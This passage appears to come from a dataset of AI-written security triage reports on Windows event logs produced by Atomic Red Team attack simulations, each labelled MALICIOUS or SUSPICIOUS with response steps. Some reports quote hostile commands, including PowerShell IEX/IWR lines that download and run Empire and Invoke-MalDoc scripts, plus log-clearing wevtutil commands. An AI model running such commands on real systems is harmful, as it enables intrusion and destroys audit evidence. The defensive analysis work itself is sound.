   - Review recent activities of the user account ""admin_test"" to determine any unauthorized usage.

5. **Enhance Monitoring**:
   - Increase monitoring on critical systems and user accounts to detect similar behaviors elsewhere in the environment.

### Resolution

Given the analysis above, the overall activity contained in the logs fits the pattern associated with illegal system access and tampering efforts that are consistent with a security breach. Hence, the resolution is:

- **MALICIOUS**: The logs indicate clear signs of malicious activity."
Admin Account Manipulate,"Based on the analysis of the provided logs, there are several indicators of suspicious and potentially malicious activity:

1. **Clearing Event Logs:**
   - Events in the system log show that the system log, the Windows PowerShell log, and the security log were cleared by the user ""admin_test"" (Event IDs: 104 and 1102). Clearing event logs is a common technique used by attackers to cover their tracks and is considered suspicious, especially if done unexpectedly.

2. **Suspicious PowerShell Activity:**
   - A PowerShell command was executed by the user ""admin_test"" with the intent to rename local administrator accounts (visible in the sysmon and PowerShell logs). The use of PowerShell with commands targeting the renaming of an 'Administrator' account is very suspicious and suggests a potential privilege escalation or obfuscation attempt.
   - The command includes renaming an administrator account to a random string ""HaHa_xxxxx"", which is not a standard administrative activity. This behavior is often associated with malicious scripts intending to maintain access or disrupt system operations.

3. **Privilege Escalation:**
   - The same user ""admin_test"" holds privileges like `SeSecurityPrivilege`, `SeDebugPrivilege`, etc., typically used for advanced administrative tasks (Event ID: 4672). The combination of these powerful privileges with the clearing of logs further enhances suspicion.

Based on the logs, we can correlate the suspicious PowerShell activity with the clearance of logs by the administrative user, increasing the likelihood of malicious intent. The PowerShell script attempts to modify user accounts, which could imply a breach aiming to establish persistence or alter security configurations on the host.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- **Immediate Isolation:** The affected system should be isolated from the network to prevent further compromise or data exfiltration.
- **Forensic Analysis:** Preserve all relevant data for a forensic investigation to understand the full scope and method of the attack.
- **Review User Activities:** Investigate the account ""admin_test"" and any associated credentials to ensure they have not been compromised.
- **Check for Indicators of Compromise (IoCs):** Conduct a comprehensive scan for any malware or further indicators of compromise.
- **Enhance Logging and Monitoring:** Ensure that logging is configured to be robust and monitor future log clearing or PowerShell usage by administrative users.
- **User Education and Policy Review:** Educate users on security best practices and review policies regarding administrative access and log management."
Scheduled task Local,"**Analysis of Windows Event Logs**

1. **Process Execution and Command-Line Analysis:**
   - **wevtutil.exe**: This utility is used to clear event logs, as indicated by the command `wevtutil.exe cl`, which appears multiple times across different event log channels (Sysmon logs). The frequent use of `wevtutil.exe` to clear logs can be a common tactic to cover tracks after malicious activities.
   - **schtasks.exe and cmd.exe**: The command `cmd.exe /c SCHTASKS /Create` is used to create a scheduled task to run `cmd.exe`. This action could be used for persistence or scheduling tasks without user intervention. This is often seen in malware for establishing a foothold or executing commands at a certain time.

2. **Event Log Clearing:**
   - In the **Security log**, there is a clear event log (EventID 1102) triggered by `admin_test`. The clearing of security logs can be an indication of an attempt to remove traces of unauthorized activity.
   - The **System log** also shows events with `EventID 104` indicating the logs have been cleared for channels System and Windows PowerShell by the same user.

3. **Privilege Escalation:**
   - The user `admin_test` has been granted multiple high-impact privileges such as `SeDebugPrivilege` and others, as indicated by EventID 4672 in the Security log. This could be used to execute unauthorized actions with elevated rights.

4. **Additional Observations:**
   - **System Integrity and Updates**: System-related actions like `sppsvc.exe` and `TrustedInstaller.exe` executions do not seem immediately suspicious and are often associated with legitimate system operations and updates.
   - **Miscellaneous Commands**: Execution of benign utilities such as `hostname.exe` and `whoami.exe` could be normal, except when used in conjunction with suspicious activities as reconnaissance tools.

**Assessment of the Situation:**
From the analysis of the events, there are clear signs that the actions performed by the user `admin_test` indicate potentially malicious behavior. The frequent clearing of event logs, creating of scheduled tasks via command line with `SCHTASKS`, and the assignment of multiple high-privilege rights are activities that align with tactics used in an attack lifecycle to maintain persistence, escalate privileges, and cover tracks.

**Threats or Risks Identified:**
- Potential unauthorized actions performed by user `admin_test`.
- Log tampering and clearing could obscure crucial evidence needed to trace the actions taken on the system.
- The creation of scheduled tasks without proper context could lead to persistence mechanisms for malware execution.

**Resolution:**
The activity observed in the logs should be classified as **MALICIOUS**. Immediate action should be taken to:
- Investigate the origin and intent of the scheduled task and its context.
- Examine systems for any indicators of compromise or additional persistence mechanisms.
- Conduct a thorough security assessment and restrict or monitor the suspicious user's activities.
- Consider alerting the security team for potential incident handling and further investigation.

It is critical to ensure enhanced monitoring and potential rollback to a known secure state if system integrity is compromised."
Process Injection with Go using CreateThread WinAPI,"Upon reviewing the provided Windows event logs across different channels including Application, Windows PowerShell, Security, Sysmon, and System logs, the following observations and analysis are made:

### Key Observations:
1. **Windows Defender Status (Application Log)**
   - Windows Defender is active (`SECURITY_PRODUCT_STATE_ON`), indicating that the system's built-in antivirus is running, providing a layer of security.

2. **PowerShell Execution (Windows PowerShell Log)**
   - The PowerShell logs show the execution of `CreateThread.exe` with a `-debug` argument from the path `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1055\\bin\\x64\\`.
   - The usage of a tool from Atomic Red Team's path suggests the potential for security testing being conducted. Atomic Red Team is known for being used in adversary emulation and threat emulation scenarios.

3. **Log Clear Operations (Security and System Logs)**
   - Security log shows Event ID 1102, indicating that the security logs have been cleared by user `admin_test`. This is a red flag as clearing logs can be an attempt to cover tracks after malicious activities.
   - Similar log clearing activities are observed in Sysmon logs and Windows PowerShell logs, raising suspicion about intentions to obfuscate activities.

4. **Time Change Events (Security and System Logs)**
   - Event IDs 4616 in Security logs indicate a change in system time, which could be used to manipulate timestamps of logs and system events.
   - This behavior, while not always malicious, can be considered suspicious especially when observed in conjunction with other anomalous activities like log clearing.

5. **Sysmon Events**
   - Multiple `wevtutil.exe` executions to clear event logs, consistent with attempts to clear logs to hide potentially suspicious activities.
   - User `SERVER002\\admin_test` frequently appears associated with activities involving high integrity level processes.

### Assessment and Conclusion:
The logs reveal behaviors that are characteristic of post-exploit scenarios often associated with adversarial actions. The execution of tools from a known simulation framework (Atomic Red Team), paired with suspicious log clearing activities and security-sensitive operations like time changes, align with patterns used to evade detection and analysis.

### Resolution:
- **SUSPICIOUS**: The identified activities in the logs, such as the systematic clearing of multiple event logs, time manipulation, and execution of potential threat simulation tools, indicate a need for further investigation. While there is evidence of potential red team exercises, the nature and scope of log clearing and time changes suggest these could be used by malicious actors as well.
  
### Guidance on How to Proceed:
1. **Conduct a Full Investigation:**
   - Verify whether the activities were authorized (e.g., internal security tests) by checking with appropriate teams or personnel.
   - Analyze system integrity and scan for additional indicators of compromise with comprehensive tools beyond Windows Defender.
   
2. **Strengthen Monitoring and Alerts:**
   - Implement alerts for critical activities such as log clearing, time changes, and unusual PowerShell executions.
   
3. **Isolate and Secure:**
   - If unauthorized, isolate the affected system to prevent lateral movement within the network. Secure credentials for any compromised user accounts (e.g., `admin_test`).
   
4. **Review Security Policies:**
   - Ensure policies and permissions are appropriately configured to limit high-risk forensic activities and privileges to trusted security personnel only.

This resolution and guidance aim to ensure any potential threats are adequately addressed while confirming whether these activities were part of sanctioned tests, such as red team exercises."
Remote Service Installation CMD,"Upon analyzing the provided Windows event logs, several indicators suggest potential malicious activity:

1. **Use of Administrative Tools**:
   - Multiple instances of `wevtutil.exe` were executed with commands to clear event logs (`cl`). This action is suspicious as it can be an attempt to hide traces of other activities.
   - Event clearing logs indicate that the `admin_test` account was used to clear Security, System, and Windows PowerShell logs at multiple times consecutively.
   - The command traces show an effort to hide tracks using high-integrity level operations.

2. **Command Line Execution and Service Creation**:
   - The logs show a suspicious use of `cmd.exe` to create a service named `AtomicTestService_CMD` with a specific binary located in the Temp directory (`AtomicRedTeam\T1543.003\bin\AtomicService.exe`). 
   - The suspicious path and service creation, along with immediate starting of the service, can indicate an attempt to run a backdoor or persistence mechanism.

3. **Parent-Child Process Relationships**:
   - The execution of numerous processes from PowerShell and Command Prompt, often indicative of script-based attacks or payload delivery, especially when coupled with obscure paths or unfamiliar executables.

4. **Log Events and Process Generations**:
   - Frequent generation of processes like `conhost.exe`, typically used alongside command line tools, can suggest automated scripts or attacks leveraging the command line.
   - Multiple instances of legitimate tools (`hostname.exe`, `whoami.exe`) executed in a close sequence can indicate reconnaissance activity, often seen in initial stages of an attack.

The observed behaviors, particularly the clearing of event logs, suspicious service creation, and repetitive process creations using administrative privileges, suggest that the logs may be linked to a penetration test or simulation of attack techniques using tools like Atomic Red Team, known for testing security posture. However, even if related to simulation, the activities precisely mimic real-world attacks.

**Resolution**: **MALICIOUS**

**Guidance**:
- **Immediate Action**: Isolate the affected system until a full investigation is completed to prevent potential lateral movement.
- **Analysis**: Verify with IT management if there was any scheduled penetration test conducted. If not authorized, consider this a real compromise.
- **Audit and Monitor**: Increase monitoring for similar patterns across other systems and review administrative accounts for unusual activity.
- **Review**: Conduct a security audit to ensure that such activities are logged and alerted in real-time for early detection.
"
Task Scheduler via VBA,"Based on the provided log entries, several indicators of potentially malicious activities can be observed, particularly involving PowerShell executions and event log manipulation. 

1. **Suspicious PowerShell Command:**
   - The PowerShell log entries showcase a command executed to download and execute a script from a GitHub repository using the `Invoke-MalDoc` script via a command `powershell.exe & {IEX (iwr ""https://...Invoke-MalDoc.ps1""...`. This use of `Invoke-WebRequest` (iwr) and execution (`IEX`) of an internet-hosted script is a common tactic in executing potentially malicious actions on a Windows system.

2. **Event Log Clearance:**
   - The Sysmon and Security logs indicate the clearing of logs: 
     - EventID 1102 in the Security log shows ""[admin_test] cleared the Security logs"".
     - EventID 104 in the System and PowerShell logs indicates ""[admin_test] cleared the System and PowerShell logs"".
   - Clearing logs is a known method to cover tracks, commonly associated with malicious intent post-compromise.

3. **Execution of Windows Service and Utility Processes:**
   - While processes like `wevtutil.exe`, `conhost.exe`, and others executed by `admin_test` are legitimate Windows utilities, their use in the sequence and under the context of cleaning system and event logs makes their execution suspicious in this context.
   
4. **High-Integrity Operations:**
   - Actions are being executed with High Integrity Level, indicating an administrator level or elevated privilege operations carried out by the user.

**Assessment:**
Given the above points, the combination of PowerShell downloading and execution of external scripts, followed by event log clearance, demonstrates activities consistent with malicious behavior. It suggests an execution of potentially harmful scripts and subsequent actions to remove traces of these activities.

**Resolution: MALICIOUS**
- The logs exhibit evidence suggesting malicious intent. The execution of the suspicious PowerShell script and immediate log clearing strongly aligns with stages in an attack scenario.

**Guidance on How to Proceed:**
1. **Immediate Isolation:**
   - Consider isolating the affected host (Server002) to prevent further potential damage or lateral movement within the network.

2. **Forensic Investigation:**
   - Conduct a full forensic investigation on Server002 to analyze the extent of the compromise, focusing on file integrity, registry changes, and network connections during the time of these events.

3. **Audit and Monitoring:**
   - Enhance monitoring for similar suspicious activities, particularly around PowerShell executions and event log alterations.
   - Implement alerting on events such as script executions from remote sources, especially when paired with log cleaning or modification.

4. **Incident Response:**
   - Notify the appropriate incident response team to handle containment, eradication, and recovery procedures.
   - Assess the need for disclosure if sensitive information was accessed or exfiltrated.

5. **Review Security Policies:**
   - Review and potentially adjust security policies, including PowerShell execution policies and audit logging settings to deter future incidents.
  
By following the above guidance, the organization can better safeguard against future incidents and mitigate the impact of any potential data breaches."
Change Startup Folder - HKCU Modify User Shell Folders Startup Value,"Upon reviewing the provided event logs, several indicators of suspicious activity have been identified:

1. **PowerShell Activity**:
   - Numerous PowerShell logs show commands being executed to create a directory, copy `calc.exe` to the new directory, and update the ""Startup"" registry entry to point to this directory (`$env:TMP\atomictest\`). This behavior is suspicious as it could potentially be used to automate starting `calc.exe` upon system boot, a technique often leveraged in persistence-related attacks.

2. **Privilege Escalation**:
   - Security log entries reveal activities involving the user `admin_test` that include special privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others which are typically indicative of administrative control or potential misuse for privilege escalation.

3. **Clearing of Event Logs**:
   - Both the security and system event logs have entries with Event ID `1102` and Event ID `104` respectively, indicating that logs were cleared. This is a major red flag as attackers usually clear logs to cover their tracks after compromising a system.

4. **Suspicious Command Execution**:
   - Sysmon logs reveal the execution of the `wevtutil.exe` command to clear the event logs. This utility can be used to manage and clear Windows event logs, but its operation in this context appears as an indicator of malicious intent to remove traces of activity.

5. **Time Manipulation**:
   - There are indications in the system logs that the system time was altered. Changing system time is another indicator of potential malicious activity as attackers might do this to manipulate timestamps in logs or to bypass time-based security controls.

Collectively, these log entries suggest that the system has been potentially compromised. The pattern of activities (use of PowerShell for potentially malicious purposes, clearing of event logs, and manipulation of log timestamps) are consistent with behaviors seen in cybersecurity incidents involving privilege misuse and persistence mechanisms.

**Conclusion**: 
Given the findings of suspicious PowerShell activity, privilege escalation, clearing of event logs, and time manipulation, the overall assessment of the situation is MALICIOUS. Immediate incident response actions should be initiated to isolate the affected system, conduct further forensic investigation, and rectify any malicious changes to prevent recurring threats."
Azure - adding user to Azure role in subscription,"Upon analyzing the provided log entries from the Windows host ""Server002,"" several activities stand out as anomalies and indicators of potential malicious activity:

### 1. **Event Log Clearing:**
- **Security Log Cleared**: The event with `EventID=1102` in the Security log indicates that the security log has been cleared by `admin_test`. This is often a strong indicator of malicious behavior as attackers commonly clear logs to cover their tracks.
- **Sysmon Log, Application Log, and System Log Clearing**: Multiple `wevtutil.exe` commands were executed to clear event logs (`cl` command), indicated in the Sysmon logs. These commands were executed by the `admin_test` user with high integrity levels, which suggests an attempt to hide activity on this machine.

### 2. **PowerShell Activity:**
- The logs show the execution of a PowerShell script using potentially sensitive operations, such as importing modules (`Az.Resources`), converting secure strings, and altering Azure role assignments. The use of PowerShell to manage Azure subscriptions and roles can be legitimate; however, executing PowerShell with administrative privileges and performing role assignments (`New-AzRoleAssignment`) without clear organizational context may indicate unauthorized usage or privilege escalation.

### 3. **Privileged Token Usage:**
- The presence of `EventID=4672` indicates that privileged accounts were being used, which includes various high-level privileges such as `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`. Such privileges, especially when combined with the clearing of logs, can suggest an unauthorized use of a service account or an escalation of privileges.

### 4. **Suspicious Process Creation:**
- Use of `CompatTelRunner.exe`, a process usually related to telemetry, is seen executing through multiple role assignments and account lookups, which is not typical. The use of native Windows processes in unconventional ways can sometimes signal living-off-the-land techniques where attackers abuse legitimate tools for their operations.

### Assessment and Resolution:

Given the combination of event log clearing, execution of administrative-level PowerShell scripts modifying Azure roles, and abnormal use of processes, these activities cannot be dismissed as benign. They align more with standard attack methodologies.

**Resolution: ** 
- **MALICIOUS** - The combination of these actions reflects an attempt to cover tracks (log clearing), execute potentially harmful administrative actions (PowerShell role assignment), and privilege usage inconsistent with routine operations. Immediate incident response actions should be initiated to contain and further investigate this compromise, including:
  - Isolating affected systems to prevent further unauthorized actions.
  - Conducting a thorough forensic analysis to understand the full scope of the compromise.
  - Reviewing and revoking any unauthorized Azure role assignments.
  - Reinforcing monitoring for similar patterns across the enterprise environment."
Scheduled Task Executing Base64 Encoded Commands From Registry,"In reviewing the provided logs, several events stand out as potentially suspicious or indicative of malicious activity. Below is an analysis of the logs that contribute to this assessment:

1. **Log File Clearance Events**: 
   - We observe multiple instances of log files being cleared, specifically the System and Security event logs cleared by the user ""admin_test"". This behavior is highly suspicious as it can be a tactic used to cover tracks after conducting unauthorized or malicious activities.

2. **Suspicious Command Execution**:
   - A registry key modification and scheduled task creation using `cmd.exe` with a complex command line that involves base64 encoding and a scheduled task creation is noted.
   - The `schtasks.exe` command is used to schedule a daily task that executes a PowerShell command, potentially allowing for remote code execution. This behavior aligns with known tactics for persistence or remote code execution often used in malicious activities.

3. **Use of Wevtutil.exe**:
   - `wevtutil.exe` is used to clear event logs, which aligns with the log clearing events observed. The frequent invocation of `wevtutil.exe`, particularly to clear logs, is concerning and typically associated with malicious intentions to hinder forensic analysis.

4. **Kernel and Time Events**:
   - Although there are events indicating time and time zone changes, these are typical in certain maintenance scenarios and might not be inherently malicious on their own. However, if seen parallel to log clearing and suspicious command execution as reflected, they might support the intent to hinder timestamp correlation.

5. **Process Execution from Uncommon Locations**:
   - Executing critical commands and tools like `schtasks.exe` and `cmd.exe` from user directories or through scripts in atypical directories is often suspected when tied to known user accounts conducting unauthorized changes.

Given these observations, the combination of the log file clearing, the registry modification using base64 encoded data, scheduled tasks with PowerShell command execution, and the misuse of system utilities for covering tracks strongly suggest malicious activity.

Resolution: **MALICIOUS**

**Guidance on How to Proceed**:
- **Immediate Actions**:
  - Isolate the affected machine to prevent any further unauthorized access or propagation.
  - Change all relevant account credentials, especially focusing on accounts involved in the suspicious activities (e.g., ""admin_test"").
  - Review scheduled tasks on the system and disable any tasks that were created unexpectedly or match the malicious pattern observed.
  
- **Investigative Actions**:
  - Conduct a deeper forensic analysis on the machine to understand the full scope of the compromise, including lateral movement, potential data exfiltration, and any other changes made during the time of suspicious activities.
  - Analyze network activity logs to identify any potential external command and control communication.
  
- **Preventive Actions**:
  - Implement stricter logging and monitoring for administrative activities, including log file clearing events and unexpected command execution from admin accounts.
  - Conduct a thorough security audit on systems with similar configurations or permissions as ""Server002"" to detect similar incidents.
  
This assessment highlights potentially impactful security events that require immediate attention and continuous monitoring to mitigate the threat and prevent future occurrences."
Domain Password Policy Check: No Special Character in Password,"Upon analyzing the provided logs, several points of concern are noticeable:

1. **Log Clearing Activities**:
   - In the System log, there are several entries indicating that logs have been cleared. Specifically, Event ID 104 from the ""Microsoft-Windows-Eventlog"" is triggered when the event logs are cleared. These entries show that both the System and PowerShell logs were cleared by the user ""admin_test"".
   - Similarly, in the Security log, Event ID 1102 indicates that security logs are cleared.

2. **PowerShell Activity**:
   - The PowerShell logs show a script that changes the password and involves credential handling. The use of such a script might be legitimate; however, when coupled with the clearing of logs, it heightens suspicion since PowerShell scripts that manage passwords can be related to credential theft or unauthorized access.

3. **Sysmon Logs**:
   - Numerous instances of `wevtutil.exe` (Windows Event Utility) are seen, used to clear logs, evidenced by command-line usage like `""wevtutil.exe"" cl System` and similar for other channels. This aligns directly with the log clearing activities noted.
   - There is also legitimate Microsoft Edge update activity. However, this does not align temporally directly with the log clearing and PowerShell activity, reducing its likelihood as a threat but its attachment to SYSTEM processes might need verifying against patch schedules to fully rule out exploitation.

Considering these points:

- The log-clearing actions without clear justification or preceding maintenance tasks appear suspicious, especially when combined with the PowerShell activity that involves credential management and an attempt to change passwords.
  
- While each identified action might have a benign explanation in isolation, their concurrent appearance in conjunction with log clearing tactics (typical of obfuscation efforts by malicious actors) suggests a deliberate attempt to hide activities which could potentially be malicious.

**Resolution**: SUSPICIOUS

Due to the nature of these findings:
- Further investigation is necessary, such as auditing the user's role and recent behavior, verifying the intention behind the PowerShell script execution, and determining if such log clearing aligns with organizational policy and expected administrative activity.
- It's also recommended to check for any anomalies concerning user groups and permissions, especially related to the ""admin_test"" account.
- Implementing tighter monitoring on the host in question and potentially across the network for similar activity patterns would be prudent."
Bad Potato,"The logs reveal a sequence of activities that strongly indicate potentially malicious behavior and possible compromise of the Windows host. Here's a detailed analysis:

1. **Use of `wevtutil.exe`:** Multiple instances of `wevtutil.exe` being executed to clear logs for various event channels (`Sysmon`, `Application`, `Security`, `System`, `Windows PowerShell`) by the user `SERVER002\\admin_test`. Clearing event logs is a common tactic employed by attackers to cover their tracks post-exploitation.

2. **Windows PowerShell Activity:**
   - A PowerShell script is executed with a command line that invokes `BadPotato.exe`, a publicly available exploit used to elevate privileges via the exploitation of Windows services vulnerability. This is a significant indicator of compromise and potential privilege escalation attempt.
   - This process was initiated from a temporary directory, which raises further suspicion as it is common for attackers to execute malicious scripts from such directories.

3. **Registry and Environment Monitoring:**
   - The registration and starting of various PowerShell providers (`Registry`, `Alias`, `Environment`, etc.) following the suspicious PowerShell execution suggests the script was actively interacting with the system's environment, potentially modifying configurations or settings.

4. **Security Log Activity:**
   - Security logs, along with several other log categories, were cleared by the same user (`admin_test`). This action is particularly suspicious as it often indicates an attempt to remove traces of unauthorized actions.

5. **Concurrent Use of `whoami.exe` and `hostname.exe`:**
   - While `whoami.exe` is often used legitimately to determine the current user context, in the context of this sequence of events, it could be used by an attacker to confirm their level of access post-exploitation. The `hostname.exe` usage is innocuous on its own but takes on a more concerning hue given the surrounding activity.

6. **Other System Actions:**
   - Actions like the installation/update processes for Microsoft Edge are logged; however, they bear no immediate signs of malicious intent and seem routine.

**Conclusion and Recommendation:**
The findings clearly indicate **MALICIOUS** activity, characterized by the execution of `BadPotato.exe` via PowerShell for leveraging a known vulnerability, followed by systematic log clearing, typical of an attempt to erase evidence of a breach. Immediate actions recommended include:
- Conduct a thorough forensic review of the affected system.
- Isolate the host from the network to prevent any further lateral movements.
- Review user `admin_test` credentials for any unauthorized usages.
- Implement security patches and configurations to address the vulnerability exploited by `BadPotato.exe`.
- Increase monitoring across the network for similar indicators of compromise."
Add a driver,"Upon reviewing the provided Windows event logs, the following observations and analysis are made:

1. **Log File Clearing Activity**: 
   - The `wevtutil.exe` tool is used multiple times with the command line argument `cl` (clear log) against various logs (e.g., Microsoft-Windows-Sysmon/Operational, Application, System, Windows PowerShell, Security). The clearing of event logs is often indicative of attempts to cover tracks after potential unauthorized or malicious activity.
   - Log entries indicate that the user `SERVER002\admin_test` performed the log-clearing operations. Notably, the `Security` event log is cleared (EventID 1102), which is specifically suspicious since this log typically records security-related activities.

2. **Time Manipulation**:
   - The logs show time changes captured by the `Microsoft-Windows-Kernel-General` and `Microsoft-Windows-Security-Auditing` logs (EventID 4616), where the system time is adjusted backwards. Time alterations can be used to manipulate timestamps of logs and events, potentially masking illicit activities.

3. **Suspicious Process Execution**:
   - The command `""cmd.exe"" /c pnputil.exe /add-driver ""C:\\Windows\\INF\\usbstor.inf""` is executed. While `pnputil.exe` is a legitimate Windows utility for managing driver packages, execution from a potentially non-standard path or by an unexpected user could be concerning if not part of standard operations or updates, especially coinciding with other suspicious activities.

4. **Use of `whoami` and `HOSTNAME`**:
   - The execution of `whoami.exe` and `hostname.exe` typically indicates an attempt to gather system information or confirm the identity of the current user context. This information gathering, in conjunction with other suspicious activities, could be part of a larger reconnaissance or privilege escalation attempt.

5. **High Integrity Level**:
   - The suspicious commands and processes are executed under a high integrity level, which implies elevated privileges, providing the potential for significant unauthorized actions on the system.

**Assessment**:
- The combination of cleared security logs, time manipulation, and other factors like unusual command executions indicate a pattern that aligns with potential malicious behavior attempting to obfuscate actions or prepare the environment for further exploitation.

**Resolution**: MALICIOUS

**Guidance on How to Proceed**:
- Immediately isolate the affected system (`Server002`) to prevent further unauthorized access.
- Conduct a forensic analysis to understand the scope of the compromise and ensure no other systems are affected.
- Restore logs from backups (if available) for an accurate audit trail.
- Review and implement enhanced security practices, such as restricting the use of tools like `wevtutil`, monitoring for log clearance activities, and enforcing strict access controls and auditing.
- Consider endpoint detection and monitoring solutions to detect similar activities in the future.
- Collaborate with incident response teams or law enforcement as necessary, depending on the severity and impact of the incident."
Named pipe client impersonation,"### Detailed Analysis of Logs

**1. Application Logs**
- The logs record routine entries related to Windows Defender, showing it is active and in the ""ON"" state. This indicates that the security product is functioning correctly and provides no indication of any malicious activity.

**2. Windows PowerShell Logs**
- Several PowerShell events are logged with EventID 600, indicating the start of new PowerShell sessions or activities.
- A particularly concerning detail is the command in the HostApplication field: `powershell.exe &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose}`.
- This command-line activity suggests a script is being downloaded and executed from an external URL, which is part of the BC-Security/Empire framework known for penetration testing and post-exploitation tactics, including privilege escalation.

**3. Security Logs**
- EventID 1102 indicates that the event log was cleared by a user with administrative privileges (`admin_test`). Log clearing is a potential indicator of an attacker attempting to cover their tracks.
- A 4616 event displays a suspicious time change suggesting manipulation of system time, which could be associated with tampering or attempts to obscure activity within the logs.
- Elevated privileges are seen in EventID 4672 for `admin_test`, listed with multiple powerful privileges, further suggesting possible privilege escalation activities.
- Several logon events (EventID 4624) display NTLM authentication from an external host (NTLMSSP), potentially indicating excessive or abnormal authentication attempts from non-standard sources or processes.

**4. Sysmon Logs**
- There are numerous instances of the `wevtutil.exe` command being used to clear event logs with the command `cl` (clear). This, combined with the cleared event log from the Security log, is indicative of log tampering.
- The presence of a command to execute PowerShell using Empire confirms the execution of a potentially malicious script as described in the PowerShell log section.

**5. System Logs**
- Similar to the Security logs, there are cleared logs (EventID 104), which again may imply attempts to remove traces of activity on the system.
- There are entries potentially suggesting that system time was adjusted, consistent with the 4616 event in the Security logs.

### Assessment
- **Indicators of Compromise:** The use of Empire framework, cleared event logs, and an external script execution are clear signs of malicious activity. These activities are consistent with an attacker attempting privilege escalation, execution of possibly malicious scripts, and subsequent log tampering to cover tracks.

### Conclusion
**Resolution:** **MALICIOUS**

**Guidance on How to Proceed:**
- Immediately isolate the affected system (Server002) from the network to prevent further unauthorized access.
- Conduct a more thorough investigation to trace back the point of entry and assess the extent of the compromise.
- Consult with the legal and HR department considering possible insider threat, as the involvement of local admin credentials (`admin_test`) and privilege escalation does suggest potential unauthorized access.
- Conduct forensic investigation on the Server002 disk image and analyze any associated network logs or access logs.
- Implement stricter PowerShell logging and execution policies, and review administrative user access controls and segment networks appropriately.
- Review and fortify defenses to prevent similar incidents, including but not limited to updating antivirus definitions, and ensuring application and OS patches are current."
RunPE via VBA,"### Detailed Log Analysis

#### **Suspicious or Anomalous Behavior:**

1. **Event Log Clearing:**
   - **Security Log Cleared (Event ID 1102, 104):** The logs indicate that the security log was cleared (`wevtutil cl Security`). This action was performed by `admin_test`, a user with administrative privileges. Clearing logs is often an attempt to cover tracks and is considered a highly suspicious activity. 

2. **PowerShell Activity:**
   - **PowerShell Script Execution:** A PowerShell script was executed to download and execute a script from a remote URL: `https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1`. The command involves using `IEX` to execute the script directly, which can be an indicator of script-based attack or exploitation attempt, especially as it appears to be executing a known script associated with simulated attack techniques (Red Canary Atomic Red Team).

3. **WMI Activity:**
   - **Unusual Use of WMI (Event ID 1):** Instances of `WmiPrvSE.exe` appear frequently in these logs, which is typical for both administrative and malicious activities. Further investigation into what commands were executed would be necessary to rule out malicious use.

4. **Credential Access Attempts (Event ID 5379):**
   - **Repeated Failed Credential Access:** Attempts were made to access local accounts via Microsoft Account credentials using the `02txoixylodcstop` target name, and all attempts resulted in failure (ReturnCode: 3221226021). Credential access could be a sign of brute force attacks or attempts at lateral movement.

5. **Suspicious Pattern of Logging Activity:**
   - Multiple logs showing host executions, including `hostname.exe`, `whoami.exe`, and commands involving environment recon and system interrogation, which can be normal but in context could suggest reconnaissance if the times align with other suspicious activity.

6. **Taskhost and System Account Usage:**
   - `taskhostw.exe` and system processes run by `NT AUTHORITY\SYSTEM` indicate regular system tasks. However, they can also be used to hide malicious activities, which requires closer scrutiny concerning the aligned PowerShell and other suspicious activities.

#### **Potential Malicious Indications:**
- The log file clearing (Security, System, Windows PowerShell) suggests an attempt to cover tracks, which strongly indicates malicious intent.
- The use of PowerShell to download and execute potential malicious scripts aligns with common attack vectors found in compromised systems.
- Elevated privileges (Event ID 4672, PrivilegeList) are shown, which can be utilized for unauthorized access or privilege escalation.

### Assessment and Resolution
Based on the above analysis, the logs show clear indications of malicious activities. The combination of log clearing, suspicious PowerShell usage, and credential access attempts supports this assessment.

- **Resolution: MALICIOUS**

### Guidance on How to Proceed
1. **Immediate Containment:**
   - Isolate the host (Server002) from the network to prevent any potential further spread of malicious activity.
  
2. **Thorough Examination:**
   - Conduct a comprehensive forensic examination of the host for any signs of malware, persistence mechanisms, and other artifacts of compromise.
   - Review network logs for signs of data exfiltration or command and control communications.
  
3. **Account Verification:**
   - Verify and reset credentials for accounts flagged in the logs (`admin_test` and SYSTEM account) to prevent unauthorized access.
  
4. **Comprehensive Threat Hunt:**
   - Expand threat hunting to other network systems to ensure this compromise is not part of a larger attack.
  
5. **Patch Management and Monitoring:**
   - Ensure all systems are up to date with patches and closely monitored for any indicators of familiar attack tactics, using enhanced logging and anomaly detection mechanisms.

Implementing these steps will help mitigate the risk and potentially compromised systems while ensuring steps are taken to prevent future incidents."
Reg Key RunOnce,"Based on the analysis of the provided logs, I have identified several suspicious activities that indicate potential malicious actions.

### Analysis

1. **Log Cleared Events:**
   - **Security Log EventID 1102:** This indicates that the security log was cleared by the user `admin_test`. This action is highly suspicious as attackers often clear logs to remove traces of unauthorized activities.
   - **System Log EventID 104:** Similarly, the system and Windows PowerShell log channels were cleared by the same user `admin_test`. This further supports the suspicion as clearing multiple logs is often used to cover tracks.

2. **Time Changes:**
   - **Kernel-General EventID 1 and 24:** Multiple events showing system time changes through the use of `svchost.exe` are recorded. It is suspicious when time is adjusted in a non-typical manner, especially if it coincides with other suspicious behaviors like log clearing.

3. **Process Creation and Execution:**
   - **Sysmon EventID 1 (Process Creation):** The logs capture commands such as `wevtutil.exe cl` targeting various log channels (Sysmon, Application, Security, etc.), which are consistent with methods to delete logs.
   - **Suspicious Command Execution:**
     - The execution of `cmd.exe` with a command to add a registry key under `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx`. The appearance of `AtomicRedTeam.dll` in this command suggests simulation or use of known atomic testing techniques, which could suggest malicious intent.
     - Presence of tools like `reg.exe` associated with registry modifications executed by the administrative user.

4. **Integrity Level and Administrative Privileges:**
   - Multiple processes, such as `whoami.exe`, `wevtutil.exe`, `cmd.exe`, and others, executed with a high integrity level indicating administrative level actions. This privilege level is often required for actions like log clearing and registry manipulation.

### Conclusion

After reviewing the behaviors observed in the logs:

- The clearing of security and system logs by an administrative user.
- Changes to system time potentially to manipulate log timelines.
- Execution of processes consistent with malicious activity (e.g., log clearing, suspicious registry changes).

These indicators collectively suggest a high likelihood of malicious activity.

### Resolution: MALICIOUS

### Guidance

- **Immediate Action Required:** 
  - Isolate the system `Server002` to prevent further unauthorized access or damage.
